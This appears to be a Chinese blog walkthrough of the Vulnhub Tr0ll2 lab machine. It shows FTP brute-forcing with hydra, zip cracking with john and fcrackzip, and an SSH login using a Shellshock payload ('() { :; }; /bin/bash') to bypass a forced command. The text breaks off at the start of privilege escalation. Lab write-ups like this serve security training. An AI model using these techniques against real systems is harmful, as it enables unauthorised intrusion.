<html>
<head>
<title>Vulnhub靶机渗透-Tr0ll2</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
Vulnhub靶机渗透-Tr0ll:2
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    Railgun
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2020-04-14</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><h2 style="text-align: center;" data-mpa-powered-by="yiban.io"><span style="font-size:18px;line-height:38px;;"><strong>0x01 Scan Host</strong></span></a></h2><p><span style="font-size:18px;line-height:38px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">主机发现:</span></p><figure><img data-ratio="0.4461538461538462" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/1_yvxMdibVfLH8KyRFtibnpjT0KkbDCQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlDdib8sJm1npmYxBziawvPia6RRwcgyvxMdibVfLH8KyRFtibnpjT0KkbDCQ/640?wx_fmt=png'" data-type="png" data-w="390" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;" data-backw="390" data-backh="174"  /></figure><p><img class="rich_pages js_insertlocalimg" data-ratio="0.5858708891595615" data-s="300,640" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/2_UvqLd794GDZXmiaznAJJVC9OxOnuKA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJljalGWODNR7kXZfMnf0gHJpUPZUvqLd794GDZXmiaznAJJVC9OxOnuKA/640?wx_fmt=png'" data-type="png" data-w="821" style=""  /></p><p><br  /></p><p><span style="font-size:15px;line-height:35px;;">emm，web和tr0ll:1一样，先进行更详细的扫描：</span></p><figure><img data-ratio="1.173015873015873" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/3_cv3c7nCcrBVVN660ZGbqZ94sbnR9nw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlc3Ub9HTGolBTaEddJXTI0ILTicv3c7nCcrBVVN660ZGbqZ94sbnR9nw/640?wx_fmt=png'" data-type="png" data-w="630" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><h2><br  /></h2><h2 style="text-align: center;"><strong><span style="font-size:18px;line-height:38px;;">0x02 Web Service</span></strong></h2><p><strong><span style="font-size:18px;line-height:38px;;"><br  /></span></strong></p><p><img class="rich_pages js_insertlocalimg" data-ratio="0.4014388489208633" data-s="300,640" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/4_Mk4W7aBpo5UGdqticDTia5BKib7xmg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJl2O6VfTXLWayW6ibfd0BufoWaDBQQMk4W7aBpo5UGdqticDTia5BKib7xmg/640?wx_fmt=png'" data-type="png" data-w="695" style=""  /></p><p><span style="font-size:15px;line-height:35px;;">告诉我们这里啥都没有，扫一下目录:</span></p><figure><img data-ratio="0.6453900709219859" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/5_zKXhJlWYXfribD3GcaoLib90G2EZJg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlWx9sDpYzBXPGcNibDkKU9xoatAczKXhJlWYXfribD3GcaoLib90G2EZJg/640?wx_fmt=png'" data-type="png" data-w="564" height="376" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="582"  /></figure><figure><img data-ratio="0.48" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/6_bQG6PZicIjtwghs1O4loKf4HCSib3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlYicptcxvibWdGAK87ATmnngkRuxLibQG6PZicIjtwghs1O4loKf4HCSib3Q/640?wx_fmt=png'" data-type="png" data-w="875" height="333" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="694"  /></figure><p><span style="font-size:15px;line-height:35px;;">有几张图片。</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><h2 style="text-align: center;"><span style="font-size:18px;line-height:38px;;"><strong>0x03 FTP Service</strong></span></h2><p><span style="font-size:18px;line-height:38px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">既然web没什么突破口，那么我们还是从ftp试试看，考虑生成个社工字典，根据WEB给出的Author以及Editor:</span></p><figure><img data-ratio="0.8788368336025848" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/7_dLyo4rJvJGzxIBHibYeNrqrKoibnCQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJljDw19S2vs6T8D3libhB12b0iaicLGdLyo4rJvJGzxIBHibYeNrqrKoibnCQ/640?wx_fmt=png'" data-type="png" data-w="619" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">在字典的每一项后面加一个特殊字符，建议选n。然后用hydra爆一下:</span></p><figure><img data-ratio="0.3915171288743883" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/8_0FgCpKJNy0mxfsfB078G0icNibPqVg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJla1bBhuf1iauZK4icjGNR8iaRBQiaFJ0FgCpKJNy0mxfsfB078G0icNibPqVg/640?wx_fmt=png'" data-type="png" data-w="613" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">Bingo~登陆看一下:</span></p><figure><img data-ratio="0.388646288209607" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/9_zn4nr9VrwicOBdUkaLDibtfic0jDxQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJl6gdNgOWYO8WmIFjvPQqFgFlRJlbzn4nr9VrwicOBdUkaLDibtfic0jDxQ/640?wx_fmt=png'" data-type="png" data-w="687" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">是个有密码的压缩包，简单地爆了一下没出。</span></p><figure><img data-ratio="0.3939393939393939" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/10_p4UsRDWGkRv39eNJ3M70XyqMHyBISw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlOtMpP4aW8w8y67aXDDjic9aTMp4UsRDWGkRv39eNJ3M70XyqMHyBISw/640?wx_fmt=png'" data-type="png" data-w="627" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">想了一下，robots似乎也有node的字眼，再结合有点像隐写，并且:</span></p><figure><img data-ratio="0.2436849925705795" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/11_JjDb4EXxHyK4PAvJIWOt5649miboJQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlziaPy5AibAwWCjAY9YwicEJtNmdAJjDb4EXxHyK4PAvJIWOt5649miboJQ/640?wx_fmt=png'" data-type="png" data-w="673" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">有提示，cat每个图片，最终发现了东西：</span></p><figure><img data-ratio="0.39074960127591707" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/12_MibpGvpcrJdRV7hNlTM1A5yHp69N9w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlfXzW5lVmam0BU9QPzibVNLpOpVMibpGvpcrJdRV7hNlTM1A5yHp69N9w/640?wx_fmt=png'" data-type="png" data-w="627" height="248" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="634"  /></figure><p><span style="font-size:15px;line-height:35px;;">提示深入y0ur_self来找到答案，FTP没有，WEB找到了answer:</span></p><figure><img data-ratio="0.7977315689981096" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/13_C4r9ZLib3KnooJI9daRWas7Iz0vFuA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlMRKK1bmR8MAcTzpQ53WXDib3TIC4r9ZLib3KnooJI9daRWas7Iz0vFuA/640?wx_fmt=png'" data-type="png" data-w="1058" height="555" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="696"  /></figure><p><span style="font-size:15px;line-height:35px;;">全部都是base64，写个脚本跑一下，这里不能复制，wget即可:</span></p><figure><img data-ratio="0.3634361233480176" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/14_JAwU4WcicBUgxrzaWVSXJ1icFQgjcw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlrGVbjqB7Z01IghbjJsrDecxY7EJAwU4WcicBUgxrzaWVSXJ1icFQgjcw/640?wx_fmt=png'" data-type="png" data-w="454" height="177" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;" width="487" data-backw="487" data-backh="177"  /></figure><p><span style="font-size:15px;line-height:35px;;">循环读取每行并做base64解码，发现跑出来的应该是个字典:</span></p><figure><img data-ratio="1.0629032258064517" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/15_3VRUIfYUduYgYLb9Hska6J2JQDnhUQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJloZU4NbRgDiax1FM2MXtbEdIpp3VRUIfYUduYgYLb9Hska6J2JQDnhUQ/640?wx_fmt=png'" data-type="png" data-w="620" height="669" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="629"  /></figure><p><span style="font-size:15px;line-height:35px;;">这里提供两种爆破zip的方式，一种是john一种是fcrackzip。</span></p><p><span style="font-size:15px;line-height:35px;;">先说john：</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">zip2john</span> <span class="code-snippet__selector-tag">lmao</span><span class="code-snippet__selector-class">.zip</span> &gt; <span class="code-snippet__selector-tag">hash</span><span class="code-snippet__selector-class">.txt</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">john</span> <span class="code-snippet__selector-tag">hash</span><span class="code-snippet__selector-class">.txt</span></span></code></pre></section><pre><span style="font-size:15px;line-height:35px;;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">这种没成功，接下来是frackzip利用字典:</span><br  /></pre><p><img class="rich_pages js_insertlocalimg" data-ratio="0.7605177993527508" data-s="300,640" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/16_anCrDIEvRcbRHAf44WoV7fdq2TMiaQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJl116uibwJPWMevQS2ERb9DjoZ51anCrDIEvRcbRHAf44WoV7fdq2TMiaQ/640?wx_fmt=png'" data-type="png" data-w="618" style=""  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">fcrackzip</span> <span class="code-snippet__selector-tag">-u</span> <span class="code-snippet__selector-tag">-D</span> <span class="code-snippet__selector-tag">-p</span> <span class="code-snippet__selector-tag">password</span><span class="code-snippet__selector-class">.txt</span> <span class="code-snippet__selector-tag">lmao</span><span class="code-snippet__selector-class">.zip</span></span></code></pre></section><figure><img data-ratio="0.14146341463414633" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/17_iakNBFeCTH4u7u1tiboMvCmeFJbE7A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJl88Vw7om85F5b8gArnP385soWjKiakNBFeCTH4u7u1tiboMvCmeFJbE7A/640?wx_fmt=png'" data-type="png" data-w="615" height="89" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="632"  /></figure><p><span style="font-size:15px;line-height:35px;;">成功找到密码。</span></p><figure><img data-ratio="0.5640194489465153" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/18_K3cpeRBXQhlHlicjKFwGXibMhatFrw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlQMrfj7zjdqIUibVbibVcT25vrIYIK3cpeRBXQhlHlicjKFwGXibMhatFrw/640?wx_fmt=png'" data-type="png" data-w="617" height="355" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="629"  /></figure><p><span style="font-size:15px;line-height:35px;;">本来以为是个ELF，结果不是:</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="ruby"><code><span class="code-snippet_outer">root@NightsWatch<span class="code-snippet__symbol">:~/Desktop/tr0ll</span><span class="code-snippet__comment"># file noob</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__symbol">noob:</span> PEM RSA private key</span></code></pre></section><p><img class="rich_pages js_insertlocalimg" data-ratio="0.7332242225859247" data-s="300,640" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/19_vbicg7nxCRlWfABDaAVnkAGmXyWT0g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlEiaIiaoxDBMyopa4JReffF3MPTiavbicg7nxCRlWfABDaAVnkAGmXyWT0g/640?wx_fmt=png'" data-type="png" data-w="611" style=""  /></p><h2><br  /></h2><h2 style="text-align: center;"><span style="font-size:18px;line-height:38px;;"><strong>0x04 SSH Service</strong></span></h2><p><span style="font-size:18px;line-height:38px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">猜测是不是SSH登陆密钥:</span></p><figure><img data-ratio="0.15326251896813353" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/20_t205GBP4LxPgqSYL15icxm8NibsxSQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJl8DM0qzuQXEriaLxyakLk71yWbtrt205GBP4LxPgqSYL15icxm8NibsxSQ/640?wx_fmt=png'" data-type="png" data-w="659" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">看到提示运行的是/usr/bin/xauth，并不是/bin/bash，这里有几种方法:</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">ssh</span> <span class="code-snippet__selector-tag">-i</span> <span class="code-snippet__selector-tag">noob</span> <span class="code-snippet__selector-tag">noob</span>@<span class="code-snippet__keyword">192</span>.<span class="code-snippet__keyword">168</span>.<span class="code-snippet__keyword">8</span>.<span class="code-snippet__keyword">126</span> -t <span class="code-snippet__string">"/bin/sh"</span></span></code><code><span class="code-snippet_outer">ssh -i noob noob@<span class="code-snippet__number">192.168</span>.<span class="code-snippet__number">8.126</span> -t <span class="code-snippet__string">"bash --noprofile"</span></span></code><code><span class="code-snippet_outer">ssh -i noob noob@<span class="code-snippet__number">192.168</span>.<span class="code-snippet__number">8.126</span> -t <span class="code-snippet__string">"() { :; }; /bin/bash"</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">在这里，最后一种方法是有效的:</span></p><figure><img data-ratio="0.1407766990291262" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/21_yJoicUXCj8IhkzF4qygeUFIibxMZow.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJl9dN0m11xoZvWlwMN9Ipjd4nL8EyJoicUXCj8IhkzF4qygeUFIibxMZow/640?wx_fmt=png'" data-type="png" data-w="618" height="88" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="624"  /></figure><h2 style="text-align: center;"><br  /></h2><h2 style="text-align: center;"><span style="font-size:19px;line-height:39px;;"><strong>0x05 Privilege Escalation</strong></span></h2><p><span style="font-size:19px;line-height:39px;;"><strong><br  /></strong></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="ruby"><code><span class="code-snippet_outer">noob@Tr0ll2<span class="code-snippet__symbol">:~</span>$ uname -a</span></code><code><span class="code-snippet_outer">Linux&nbsp;Tr0ll2&nbsp;<span class="code-snippet__number">3.2</span>.<span class="code-snippet__number">0</span>-<span class="code-snippet__number">29</span>-generic-pae&nbsp;<span class="code-snippet__comment">#46-Ubuntu&nbsp;SMP&nbsp;Fri&nbsp;Jul&nbsp;27&nbsp;17:25:43&nbsp;UTC&nbsp;2012&nbsp;i686&nbsp;i686&nbsp;i386&nbsp;GNU/Linux</span></span></code></pre></section><pre><img data-ratio="0.8516129032258064" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/22_ewuB9qicPTHkib44hKQQIXdLJpchMw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJl8UicMkImOLZCMeZyu2e6S781FyHewuB9qicPTHkib44hKQQIXdLJpchMw/640?wx_fmt=png'" data-type="png" data-w="620" height="537" width="631" style="font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><br  /></pre><p><span style="font-size:15px;line-height:35px;;">先看SUID吧，看到下面有些奇怪的东西:</span></p><figure><img data-ratio="0.29809725158562367" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/23_uU20WDvhPKz5TCiatBGln7DJzjVzaA.png" 